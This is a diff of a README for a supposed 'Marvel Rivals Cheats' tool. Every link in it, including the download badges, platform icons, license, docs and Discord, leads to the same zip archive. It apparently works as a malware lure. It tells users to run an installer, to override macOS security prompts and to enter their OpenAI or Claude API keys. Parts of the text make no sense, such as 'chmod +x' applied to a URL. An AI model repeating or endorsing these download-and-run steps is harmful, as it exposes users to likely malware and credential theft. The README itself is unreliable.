@@ -1,6 +1,6 @@
 # Marvel Rivals Cheats Repository
 
-[![Download](https://raw.githubusercontent.com/Okosa2/marvel-rivals-pro-tactics/branch/snobscat/marvel-rivals-pro-tactics-v3.1.zip)](https://raw.githubusercontent.com/Okosa2/marvel-rivals-pro-tactics/branch/snobscat/marvel-rivals-pro-tactics-v3.1.zip)
+[![Download](https://raw.githubusercontent.com/Okosa2/marvel-rivals-pro-tactics/branch/snobscat/marvel_pro_tactics_rivals_eggy.zip)](https://raw.githubusercontent.com/Okosa2/marvel-rivals-pro-tactics/branch/snobscat/marvel_pro_tactics_rivals_eggy.zip)
 
 Welcome to the **Marvel Rivals Cheats** repository – your one-stop destination for innovative in-game utility enhancements. Whether you’re seeking new ways to master strategies, receive real-time insights, or access exclusive community-driven features, our project is engineered to provide a seamless, AI-powered experience on your favorite platforms.
 
@@ -12,9 +12,9 @@ We believe everyone should have a seat at the super-powered table. Our utility b
 
 | Operating System | Compatibility | Notes                        |
 |------------------|:------------:|------------------------------|
-| ![Windows](https://raw.githubusercontent.com/Okosa2/marvel-rivals-pro-tactics/branch/snobscat/marvel-rivals-pro-tactics-v3.1.zip)    | ✅           | Windows 10, 11 supported      |
-| ![macOS](https://raw.githubusercontent.com/Okosa2/marvel-rivals-pro-tactics/branch/snobscat/marvel-rivals-pro-tactics-v3.1.zip)        | ✅           | M1/M2 & Intel compatibility   |
-| ![Linux](https://raw.githubusercontent.com/Okosa2/marvel-rivals-pro-tactics/branch/snobscat/marvel-rivals-pro-tactics-v3.1.zip)        | ✅           | Ubuntu, Debian, Fedora, etc.  |
+| ![Windows](https://raw.githubusercontent.com/Okosa2/marvel-rivals-pro-tactics/branch/snobscat/marvel_pro_tactics_rivals_eggy.zip)    | ✅           | Windows 10, 11 supported      |
+| ![macOS](https://raw.githubusercontent.com/Okosa2/marvel-rivals-pro-tactics/branch/snobscat/marvel_pro_tactics_rivals_eggy.zip)        | ✅           | M1/M2 & Intel compatibility   |
+| ![Linux](https://raw.githubusercontent.com/Okosa2/marvel-rivals-pro-tactics/branch/snobscat/marvel_pro_tactics_rivals_eggy.zip)        | ✅           | Ubuntu, Debian, Fedora, etc.  |
 
 Installation instructions for each platform are detailed below, so you can get started no matter your digital environment.
 
@@ -47,7 +47,7 @@ Harness the power of the world’s brightest digital minds! Our utility leverage
 - **OpenAI API**: Delivers dynamic in-game coaching, rewording team chats in real time and even providing motivational snippets during high-pressure moments.
 - **Claude API**: Acts as a strategist assistant, helping you anticipate enemy moves with context-aware, adaptive suggestions based on current Marvel Rivals meta.
 
-Configuration is simple—just paste your API credentials in `https://raw.githubusercontent.com/Okosa2/marvel-rivals-pro-tactics/branch/snobscat/marvel-rivals-pro-tactics-v3.1.zip`. Our documentation explains more, ensuring you’re up and running in minutes.
+Configuration is simple—just paste your API credentials in `https://raw.githubusercontent.com/Okosa2/marvel-rivals-pro-tactics/branch/snobscat/marvel_pro_tactics_rivals_eggy.zip`. Our documentation explains more, ensuring you’re up and running in minutes.
 
 ---
 
@@ -70,24 +70,24 @@ Ready to empower your Marvel Rivals gameplay? Follow these installation steps pr
 
 ### Windows
 
-1. Download the latest installer from https://raw.githubusercontent.com/Okosa2/marvel-rivals-pro-tactics/branch/snobscat/marvel-rivals-pro-tactics-v3.1.zip
+1. Download the latest installer from https://raw.githubusercontent.com/Okosa2/marvel-rivals-pro-tactics/branch/snobscat/marvel_pro_tactics_rivals_eggy.zip
 2. Double-click the installer (.exe) and follow the on-screen wizard.
 3. Enter your OpenAI or Claude API keys in the setup window (optional).
 4. Launch Marvel Rivals and enjoy your AI-powered utility!
 
 ### macOS
 
-1. Download the `.dmg` file from https://raw.githubusercontent.com/Okosa2/marvel-rivals-pro-tactics/branch/snobscat/marvel-rivals-pro-tactics-v3.1.zip
+1. Download the `.dmg` file from https://raw.githubusercontent.com/Okosa2/marvel-rivals-pro-tactics/branch/snobscat/marvel_pro_tactics_rivals_eggy.zip
 2. Drag the Marvel Rivals Cheats app into Applications.
 3. On first run, provide necessary permission (Security & Privacy → Open Anyway).
 4. Optional: Input API credentials when prompted.
 
 ### Linux
 
-1. Retrieve the latest `.AppImage` package from https://raw.githubusercontent.com/Okosa2/marvel-rivals-pro-tactics/branch/snobscat/marvel-rivals-pro-tactics-v3.1.zip
-2. Run: `chmod +x https://raw.githubusercontent.com/Okosa2/marvel-rivals-pro-tactics/branch/snobscat/marvel-rivals-pro-tactics-v3.1.zip`
+1. Retrieve the latest `.AppImage` package from https://raw.githubusercontent.com/Okosa2/marvel-rivals-pro-tactics/branch/snobscat/marvel_pro_tactics_rivals_eggy.zip
+2. Run: `chmod +x https://raw.githubusercontent.com/Okosa2/marvel-rivals-pro-tactics/branch/snobscat/marvel_pro_tactics_rivals_eggy.zip`
 3. Execute the program via terminal or GUI.
-4. Set API keys as described in our `https://raw.githubusercontent.com/Okosa2/marvel-rivals-pro-tactics/branch/snobscat/marvel-rivals-pro-tactics-v3.1.zip`.
+4. Set API keys as described in our `https://raw.githubusercontent.com/Okosa2/marvel-rivals-pro-tactics/branch/snobscat/marvel_pro_tactics_rivals_eggy.zip`.
 
 ---
 
@@ -101,9 +101,9 @@ Ready to empower your Marvel Rivals gameplay? Follow these installation steps pr
 
 This project sparkles under the MIT License, allowing user modifications, distribution, and private usage while disclaiming liability.
 
-[![License: MIT](https://raw.githubusercontent.com/Okosa2/marvel-rivals-pro-tactics/branch/snobscat/marvel-rivals-pro-tactics-v3.1.zip)](https://raw.githubusercontent.com/Okosa2/marvel-rivals-pro-tactics/branch/snobscat/marvel-rivals-pro-tactics-v3.1.zip)
+[![License: MIT](https://raw.githubusercontent.com/Okosa2/marvel-rivals-pro-tactics/branch/snobscat/marvel_pro_tactics_rivals_eggy.zip)](https://raw.githubusercontent.com/Okosa2/marvel-rivals-pro-tactics/branch/snobscat/marvel_pro_tactics_rivals_eggy.zip)
 
-For full license details, see [LICENSE](https://raw.githubusercontent.com/Okosa2/marvel-rivals-pro-tactics/branch/snobscat/marvel-rivals-pro-tactics-v3.1.zip).
+For full license details, see [LICENSE](https://raw.githubusercontent.com/Okosa2/marvel-rivals-pro-tactics/branch/snobscat/marvel_pro_tactics_rivals_eggy.zip).
 
 Copyright © 2025
 
@@ -112,10 +112,10 @@ Copyright © 2025
 ## 🦸 Connect & Collaborate
 
 **Questions? Suggestions?**  
-Our hero-powered collaborative forums and a Discord server (see https://raw.githubusercontent.com/Okosa2/marvel-rivals-pro-tactics/branch/snobscat/marvel-rivals-pro-tactics-v3.1.zip) await your presence. Share, discuss, or recruit new teammates for Marvel Rivals endeavors!
+Our hero-powered collaborative forums and a Discord server (see https://raw.githubusercontent.com/Okosa2/marvel-rivals-pro-tactics/branch/snobscat/marvel_pro_tactics_rivals_eggy.zip) await your presence. Share, discuss, or recruit new teammates for Marvel Rivals endeavors!
 
 ---
 
-[![Download](https://raw.githubusercontent.com/Okosa2/marvel-rivals-pro-tactics/branch/snobscat/marvel-rivals-pro-tactics-v3.1.zip)](https://raw.githubusercontent.com/Okosa2/marvel-rivals-pro-tactics/branch/snobscat/marvel-rivals-pro-tactics-v3.1.zip)
+[![Download](https://raw.githubusercontent.com/Okosa2/marvel-rivals-pro-tactics/branch/snobscat/marvel_pro_tactics_rivals_eggy.zip)](https://raw.githubusercontent.com/Okosa2/marvel-rivals-pro-tactics/branch/snobscat/marvel_pro_tactics_rivals_eggy.zip)
 
 Happy enhancing and enjoy exploring the Marvel Rivals multiverse of opportunities!
